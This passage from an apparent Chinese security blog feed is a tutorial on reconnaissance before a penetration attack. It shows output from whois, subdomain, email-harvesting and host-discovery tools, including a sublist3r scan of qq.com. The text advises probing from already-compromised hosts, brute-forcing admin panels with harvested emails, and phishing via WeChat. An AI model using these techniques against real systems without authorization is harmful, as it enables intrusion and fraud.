&lt;p&gt;工作组是指数台计算机在同一个内网中，在逻辑上都属于工作组，但是在工作组中的机器之间相互没有信任关&lt;br&gt;
系，每台机器的账号密码只是保存在自己的SAM文件中。</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://www.dansemal.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://www.dansemal.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>漏洞利用</title>
    <link href="https://www.dansemal.cn/posts/ac7476fe/"/>
    <id>https://www.dansemal.cn/posts/ac7476fe/</id>
    <published>2021-03-25T11:35:43.000Z</published>
    <updated>2022-01-09T07:34:49.000Z</updated>
    
    
    
    
    <category term="漏洞利用" scheme="https://www.dansemal.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="漏洞利用" scheme="https://www.dansemal.cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>信息搜集</title>
    <link href="https://www.dansemal.cn/posts/b21d488/"/>
    <id>https://www.dansemal.cn/posts/b21d488/</id>
    <published>2021-03-25T11:35:43.000Z</published>
    <updated>2022-01-09T07:34:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息搜集概念">信息搜集概念</h2><mark class="hl-label blue">信息收集是指黑客为了更加有效地实施渗透攻击而在攻击前或攻击过程中对目标的所有探测活动</mark> <h3 id="搜集什么信息">搜集什么信息</h3><ul><li><a href="#whois">whois</a></li><li><a href="#%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84">网站架构</a></li><li><a href="#dns%E4%BF%A1%E6%81%AF">dns信息</a></li><li><a href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%90%9C%E9%9B%86">子域名搜集</a></li><li><a href="#%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF">目录信息</a></li><li><a href="#%E6%97%81%E7%AB%99%E4%BF%A1%E6%81%AF">旁站信息</a></li><li><a href="#C%E6%AE%B5%E4%BF%A1%E6%81%AF">C段信息</a></li><li><a href="#%E6%8C%87%E7%BA%B9%E4%BF%A1%E6%81%AF">指纹信息</a></li><li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">端口信息</a></li><li><a href="#%E5%A4%87%E6%A1%88%E4%BF%A1%E6%81%AF">备案信息</a></li><li><a href="#%E7%9C%9F%E5%AE%9EIP">真实IP</a></li><li><a href="#%E6%8E%A2%E6%B5%8BWAF">探测WAF</a></li><li><a href="#%E7%A4%BE%E5%B7%A5">社工</a></li><li><a href="#%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF">企业信息</a></li></ul><h3 id="信息搜集的目的">信息搜集的目的</h3><p>信息搜集的目的只有一个,通过搜集信息得知漏洞信息去利用</p><h2 id="主动搜集和被动搜集">主动搜集和被动搜集</h2><mark class="hl-label blue">主动信息搜集</mark> 是使用网站的直接访问,扫描网站,以及探测网站产生交互的被称之为主动搜集.<mark class="hl-label blue">被动信息搜集</mark> 是以通过你第三方来进行信息搜集<h2 id="信息搜集的流程">信息搜集的流程</h2><h3 id="span-id-whois-whois-span"><span id="whois">whois</span></h3><p>whois信息可以查询到注册域名的详细信息的数据库<br>whois通常使用tcp协议43端口.每个域名/ip的whois信息由对应的管理机构保存.<br>推荐站长之家api调用</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210323150846.png" alt="image-20210323150835126"></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1640500810-e3eaec71a9c8a633b1829a3279dc5133.webp" alt="1640497684134"></p><ul><li>dmitry(kali自带)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root💀B)-[~]</span><br><span class="line">└─<span class="comment"># dmitry -iwns dansemal.cn</span></span><br><span class="line">Deepmagic Information Gathering Tool</span><br><span class="line"><span class="string">&quot;There be some deep magic going on&quot;</span></span><br><span class="line"></span><br><span class="line">HostIP:183.240.60.175</span><br><span class="line">HostName:dansemal.cn</span><br><span class="line"></span><br><span class="line">Gathered Inet-whois information <span class="keyword">for</span> 183.240.60.175</span><br><span class="line">---------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inetnum:        182.161.64.0 - 184.255.255.255</span><br><span class="line">netname:        NON-RIPE-NCC-MANAGED-ADDRESS-BLOCK</span><br><span class="line">descr:          IPv4 address block not managed by the RIPE NCC</span><br><span class="line">remarks:        ------------------------------------------------------</span><br><span class="line">remarks:</span><br><span class="line">ration information,</span><br><span class="line">remarks:        you can consult the following sources:</span><br><span class="line">remarks:</span><br><span class="line">remarks:        IANA</span><br><span class="line">remarks:        http://www.iana.org/assignments/ipv4-address-space</span><br><span class="line">remarks:        http://www.iana.org/assignments/iana-ipv4-special-registry</span><br><span class="line">remarks:        http://www.iana.org/assignments/ipv4-recovered-address-space</span><br><span class="line">remarks:</span><br><span class="line">remarks:        AFRINIC (Africa)</span><br><span class="line">remarks:        http://www.afrinic.net/ whois.afrinic.net</span><br><span class="line">remarks:</span><br><span class="line">remarks:        APNIC (Asia Pacific)</span><br><span class="line">ic.net/ whois.apnic.net</span><br><span class="line">remarks:</span><br><span class="line">remarks:        ARIN (Northern America)</span><br><span class="line">remarks:        http://www.arin.net/ whois.arin.net</span><br><span class="line">remarks:</span><br><span class="line">remarks:        LACNIC (Latin America and the Carribean)</span><br><span class="line">remarks:        http://www.lacnic.net/ whois.lacnic.net</span><br><span class="line">remarks:</span><br><span class="line">remarks:        ------------------------------------------------------</span><br><span class="line">country:        EU <span class="comment"># Country is really world wide</span></span><br><span class="line">admin-c:        IANA1-RIPE</span><br><span class="line">tech-c:         IANA1-RIPE</span><br><span class="line">status:         ALLOCATED UNSPECIFIED</span><br><span class="line"></span><br><span class="line">created:        2021-12-21T16:03:56Z</span><br><span class="line">last-modified:  2021-12-21T16:03:56Z</span><br><span class="line"><span class="built_in">source</span>:         RIPE</span><br><span class="line">role:           Internet Assigned Numbers Authority</span><br><span class="line">address:        see http://www.iana.org.</span><br><span class="line">admin-c:        IANA1-RIPE</span><br><span class="line">tech-c:         IANA1-RIPE</span><br><span class="line">nic-hdl:        IANA1-RIPE</span><br><span class="line">remarks:        For more information on IANA services</span><br><span class="line">remarks:        go to IANA web site at http://www.iana.org.</span><br><span class="line">mnt-by:         RIPE-NCC-MNT</span><br><span class="line">created:        1970-01-01T00:00:00Z</span><br><span class="line">last-modified:  2001-09-22T09:31:27Z</span><br><span class="line"><span class="built_in">source</span>:         RIPE <span class="comment"># Filtered</span></span><br><span class="line">% This query was served by the RIPE Database Query Service version 1.102.2 (HEREFORD)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Gathered Inic-whois information <span class="keyword">for</span> dansemal.cn</span><br><span class="line">---------------------------------</span><br><span class="line">Domain Name: dansemal.cn</span><br><span class="line">ROID: 20210322s10001s35063278-cn</span><br><span class="line">Domain Status: clientTransferProhibited</span><br><span class="line">Registrant: 该域名已采取WHOIS隐私保护服务</span><br><span class="line">Sponsoring Registrar: 广州云讯信息科技有限公司</span><br><span class="line">Name Server: brook.dnspod.net</span><br><span class="line">Name Server: record.dnspod.net</span><br><span class="line">Registration Time: 2021-03-22 15:32:05</span><br><span class="line">Expiration Time: 2023-03-22 15:32:05</span><br><span class="line">DNSSEC: signedDelegation</span><br><span class="line"></span><br><span class="line">Gathered Netcraft information <span class="keyword">for</span> dansemal.cn</span><br><span class="line">---------------------------------</span><br><span class="line"></span><br><span class="line">Retrieving Netcraft.com information <span class="keyword">for</span> dansemal.cn</span><br><span class="line">Netcraft.com Information gathered</span><br><span class="line"></span><br><span class="line">Gathered Subdomain information <span class="keyword">for</span> dansemal.cn</span><br><span class="line">---------------------------------</span><br><span class="line">Searching Google.com:80...</span><br><span class="line">HostName:www.dansemal.cn</span><br><span class="line">HostIP:183.240.60.174</span><br><span class="line">HostName:cloud.dansemal.cn</span><br><span class="line">HostIP:112.3.31.146</span><br><span class="line">Searching Altavista.com:80...</span><br><span class="line">Found 2 possible subdomain(s) <span class="keyword">for</span> host dansemal.cn, Searched 0 pages containing 0 results</span><br><span class="line"></span><br><span class="line">All scans completed, exiting</span><br></pre></td></tr></table></figure><h3 id="span-id-邮箱搜集-邮箱搜集-span"><span id="邮箱搜集">邮箱搜集</span></h3><p>在信息搜集的过程中,邮箱信息可以解决我们很大的问题,我们可以fuzz邮箱的密码进行爆破后台.</p><h4 id="theHarvester">theHarvester</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># theHarvester -d freebuf.com -b baidu                                                               2 ⨯</span></span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">*  _   _                                            _             *</span><br><span class="line">* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *</span><br><span class="line">* | __|  _ \ / _ \  / /_/ / _` | <span class="string">&#x27;__\ \ / / _ \/ __| __/ _ \ &#x27;</span>__| *</span><br><span class="line">* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *</span><br><span class="line">*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *</span><br><span class="line">*                                                                 *</span><br><span class="line">* theHarvester 3.2.3                                              *</span><br><span class="line">* Coded by Christian Martorella                                   *</span><br><span class="line">* Edge-Security Research                                          *</span><br><span class="line">* cmartorella@edge-security.com                                   *</span><br><span class="line">*                                                                 *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Target: freebuf.com</span><br><span class="line"></span><br><span class="line">[*] Searching Baidu.</span><br><span class="line"></span><br><span class="line">[*] No IPs found.</span><br><span class="line"></span><br><span class="line">[*] No emails found.</span><br><span class="line"></span><br><span class="line">[*] Hosts found: 8</span><br><span class="line">---------------------</span><br><span class="line">bar.freebuf.com:60.205.171.29</span><br><span class="line">company.freebuf.com:60.205.171.29</span><br><span class="line">job.freebuf.com:60.205.171.29</span><br><span class="line">live.freebuf.com:60.205.171.29</span><br><span class="line">my.freebuf.com:60.205.171.29</span><br><span class="line">search.freebuf.com:60.205.171.29</span><br><span class="line">shop.freebuf.com:60.205.171.29</span><br><span class="line">www.freebuf.com:60.205.171.29</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># theHarvester -d dansemal.github.io -b baidu</span></span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">*  _   _                                            _             *</span><br><span class="line">* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *</span><br><span class="line">* | __|  _ \ / _ \  / /_/ / _` | <span class="string">&#x27;__\ \ / / _ \/ __| __/ _ \ &#x27;</span>__| *</span><br><span class="line">* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *</span><br><span class="line">*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *</span><br><span class="line">*                                                                 *</span><br><span class="line">* theHarvester 3.2.3                                              *</span><br><span class="line">* Coded by Christian Martorella                                   *</span><br><span class="line">* Edge-Security Research                                          *</span><br><span class="line">* cmartorella@edge-security.com                                   *</span><br><span class="line">*                                                                 *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Target: dansemal.github.io</span><br><span class="line"></span><br><span class="line">[*] Searching Baidu.</span><br><span class="line"></span><br><span class="line">[*] No IPs found.</span><br><span class="line"></span><br><span class="line">[*] No emails found.</span><br><span class="line"></span><br><span class="line">[*] No hosts found.</span><br></pre></td></tr></table></figure><h3 id="手机号">手机号</h3><p>手机号在信息搜集的时候也略显重要,因为我们可以通过手机号去查到关于管理人员的更多信息,甚至可以通过反查微信钓鱼的方式来进行,或者其他的方式.</p><h2 id="主动信息搜集">主动信息搜集</h2><ul><li>指通过一定的方式(系统自带命令或者其他工具)，直接与目标系统或者主机进行交互通信，以达到收集信息的目的。</li><li>主动信息收集的必要条件<br>使用受控的第3三方电脑进行探测</li><li>使用代理或者已经被控制的主机</li><li>做好被封杀的准备<br>使用噪声迷惑目标，掩藏真实的的探测流量扫描</li><li>发送不同的探测，根据返回结果判断目标状态<br>主动信息收集的发现过程</li><li>识别存活的目标系统或者主机(潜在的攻击目标)。</li><li>根据osi的分层，主要在2 (数据链路层) /3 (网络层) /4 (传输层)层进行主机发现。</li><li>输出发现结果。</li></ul><h3 id="收集所需信息">收集所需信息</h3><ul><li>开放端口</li><li>开放服务</li><li>服务版本</li><li>用户名</li><li>域名</li><li>网站系统</li><li>历史信息</li><li>身份信息</li></ul><h3 id="代理隐蔽">代理隐蔽</h3><ul><li>在主动信息过程中，可能会存在-一定被IPS/IDS检测到，我们可以使用proxychains这款工具来<br>达到代理的效果</li><li>或在Windows中使用Proxifier。</li></ul><h3 id="主机发现">主机发现</h3><p>在二层网络中,使用arping发现主机</p><ul><li>netdiscover</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀B)-[~]</span><br><span class="line">└─<span class="comment"># netdiscover -i eth0 -r 192.168.0.1/24</span></span><br></pre></td></tr></table></figure><p>netdiscover -l 文件路径 (扫描文件ip)</p><p>netdiscover -p 被动扫描</p><ul><li>fping</li></ul><p>Fping程序类似于ping (ping是通过ICMP. (网络控制信息协议InternetControl Message<br>Protocol)协议回复请求以检测主机是否存在)。Fping 与ping不同的地方在于，fping可以在<br>命令行中指定要ping的主机数量范围，也可以指定含有要ping的主机列表文件。</p><ul><li>hping3</li></ul><p>Hping能够发送几乎任意的TCP/IP包;<br>功能强大但是每次只能扫描一个目标。<br>Hping3发送ICMP包:<br>hping3 192.168.181.130 --icmp -C 2</p><h3 id="span-id-子域名搜集-子域名搜集-span"><span id="子域名搜集">子域名搜集</span></h3><ul><li><p><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a> ps.查看源代码其实是个自带字典本地子域名工具</p></li><li><h4 id="altdns"><a href="https://github.com/infosec-au/altdns">altdns</a></h4></li><li><h4 id="oneforall"><a href="https://github.com/shmilylty/OneForAll">oneforall</a></h4></li><li><h4 id="layer子域名挖掘机">layer子域名挖掘机</h4><p><img src="/image/1617970146138.webp" alt=""></p></li><li><h4 id="subDomainBrute">subDomainBrute</h4><p><img src="/image/1617971009122.webp" alt=""><br>安装常见问题 默认 python pip 版本不对应<br><a href="https://www.dansemal.cn/index.php/archives/1/#toc_3">更换默认python版本为3</a> <a href="https://www.dansemal.cn/index.php/archives/1/#toc_8">安装pip3</a> <img src="/image/1617971506170.webp" alt=""></p></li><li><h4 id="wydomain">wydomain</h4></li><li><h4 id="sublist3r">sublist3r</h4>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">af install sublist3r <span class="comment">#kali下</span></span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># sublist3r -d qq.com                                                                                                            130 ⨯</span></span><br><span class="line"></span><br><span class="line">                 ____        _     _ _     _   _____</span><br><span class="line">                / ___| _   _| |__ | (_)___| |_|___ / _ __</span><br><span class="line">                \___ \| | | | <span class="string">&#x27;_ \| | / __| __| |_ \| &#x27;</span>__|</span><br><span class="line">                 ___) | |_| | |_) | | \__ \ |_ ___) | |</span><br><span class="line">                |____/ \__,_|_.__/|_|_|___/\__|____/|_|</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Coded By Ahmed Aboul-Ela - @aboul3la</span></span><br><span class="line"></span><br><span class="line">[-] Enumerating subdomains now <span class="keyword">for</span> qq.com</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Baidu..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Yahoo..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Google..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Bing..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Ask..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Netcraft..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> DNSdumpster..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Virustotal..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> ThreatCrowd..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> SSL Certificates..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> PassiveDNS..</span><br><span class="line">[-] Total Unique Subdomains Found: 2690</span><br><span class="line">login.imqq.com</span><br><span class="line">localhost.ptlogin2.imqq.com</span><br><span class="line">ssl.ptlogin2.imqq.com</span><br><span class="line">ssl.ui.ptlogin2.imqq.com</span><br><span class="line">ssl.xui.ptlogin2.imqq.com</span><br><span class="line">www.qq.com</span><br><span class="line">0.qq.com</span><br><span class="line">007.qq.c                                                            </span><br><span class="line">021.qq.com</span><br><span class="line">1.qq.com</span><br><span class="line">10.qq.com</span><br><span class="line">100.qq.com</span><br><span class="line">file.100.qq.com</span><br><span class="line">res.100.qq.com</span><br><span class="line">1000.qq.com</span><br><span class="line">101.qq.com</span><br><span class="line">pick.101.qq.com</span><br><span class="line">game.108.qq.com</span><br><span class="line">110.qq.com</span><br><span class="line">1108.qq.com</span><br><span class="line">111.qq.com</span><br><span class="line">1111.qq.com</span><br><span class="line">124bjg0.qq.com</span><br><span class="line">12530.qq.com</span><br><span class="line">176.qq.com</span><br><span class="line">17roco.qq.com</span><br><span class="line">m.17roco.qq.com</span><br><span class="line">m1.17roco.qq.com</span><br><span class="line">mres.17roco.qq.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root💀B)-[~]</span><br><span class="line">└─<span class="comment"># sublist3r -d dansemal.cn</span></span><br><span class="line"></span><br><span class="line">                 ____        _     _ _     _   _____</span><br><span class="line">                / ___| _   _| |__ | (_)___| |_|___ / _ __</span><br><span class="line">                \___ \| | | | <span class="string">&#x27;_ \| | / __| __| |_ \| &#x27;</span>__|</span><br><span class="line">                 ___) | |_| | |_) | | \__ \ |_ ___) | |</span><br><span class="line">                |____/ \__,_|_.__/|_|_|___/\__|____/|_|</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Coded By Ahmed Aboul-Ela - @aboul3la</span></span><br><span class="line"></span><br><span class="line">[-] Enumerating subdomains now <span class="keyword">for</span> dansemal.cn</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Baidu..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Yahoo..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Google..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Bing..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Ask..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Netcraft..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> DNSdumpster..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Virustotal..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> ThreatCrowd..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> SSL Certificates..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> PassiveDNS..</span><br><span class="line">[!] Error: Virustotal probably now is blocking our requests</span><br><span class="line">[-] Total Unique Subdomains Found: 12</span><br><span class="line">www.dansemal.cn</span><br><span class="line">blog.dansemal.cn</span><br><span class="line">cdn.dansemal.cn</span><br><span class="line">cloud.dansemal.cn</span><br><span class="line">joe.dansemal.cn</span><br><span class="line">mail.dansemal.cn</span><br><span class="line">pl.dansemal.cn</span><br><span class="line">qh.dansemal.cn</span><br><span class="line">ur.dansemal.cn</span><br><span class="line">vercel.dansemal.cn</span><br><span class="line">vul.dansemal.cn</span><br><span class="line">waline.dansemal.cn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="span-id-网站架构-网站架构-span"><span id="网站架构">网站架构</span></h3><ul><li><h4 id="nikto-kali自带">nikto(kali自带)</h4></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">Options:</span><br><span class="line">    -ask+               是否询问提交更新</span><br><span class="line">                            yes   每次 (default)</span><br><span class="line">                            no    不询问,不发送</span><br><span class="line">                            auto  不询问,自动发送</span><br><span class="line">    -Cgidirs+           扫描CGI目录: &quot;none&quot;, &quot;all&quot;, 或者 &quot;/cgi/ /cgi-a/&quot;</span><br><span class="line">    -config+            使用此配置文件</span><br><span class="line">    -Display+           打开/关闭显示输出:</span><br><span class="line">                            1     显示重定向</span><br><span class="line">                            2     显示 cookies received</span><br><span class="line">                            3     显示所有 200/OK响应</span><br><span class="line">                            4     显示需要身份验证的URL</span><br><span class="line">                            D     调试输出</span><br><span class="line">                            E     显示所有HTTP错误</span><br><span class="line">                            P     打印进展到STDOUT</span><br><span class="line">                            S     Scrub输出IPS和主机名</span><br><span class="line">                            V     详细输出</span><br><span class="line">    -dbcheck           检查数据库和其他密钥文件的语法错误</span><br><span class="line">    -evasion+          编码技术:</span><br><span class="line">                            1     随机URI编码（非UTF8）</span><br><span class="line">                            2     目录自我引用 (/./)</span><br><span class="line">                            3     Premature URL ending</span><br><span class="line">                            4     预置长随机字符串</span><br><span class="line">                            5     Fake parameter</span><br><span class="line">                            6     TAB as request spacer</span><br><span class="line">                            7     Change the case of the URL</span><br><span class="line">                            8     Use Windows directory separator (\)</span><br><span class="line">                            A     Use a carriage return (0x0d) as a request spacer</span><br><span class="line">                            B     Use binary value 0x0b as a request spacer</span><br><span class="line">     -Format+           Save file (-o) format:</span><br><span class="line">                            csv   Comma-separated-value</span><br><span class="line">                            json  JSON Format</span><br><span class="line">                            htm   HTML Format</span><br><span class="line">                            nbe   Nessus NBE format</span><br><span class="line">                            sql   Generic SQL (see docs for schema)</span><br><span class="line">                            txt   Plain text</span><br><span class="line">                            xml   XML Format</span><br><span class="line">         